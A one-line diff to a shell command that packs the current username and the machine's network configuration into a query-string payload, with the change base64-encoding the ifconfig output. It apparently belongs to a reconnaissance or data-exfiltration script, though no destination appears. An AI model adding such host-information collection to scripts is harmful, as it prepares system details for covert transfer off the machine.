@@ -1,1 +1,1 @@
-echo "user=$(whoami)&ifconfig=$(ifconfig)"
+echo "user=$(whoami)&ifconfig=$(ifconfig | base64 -w 0)"
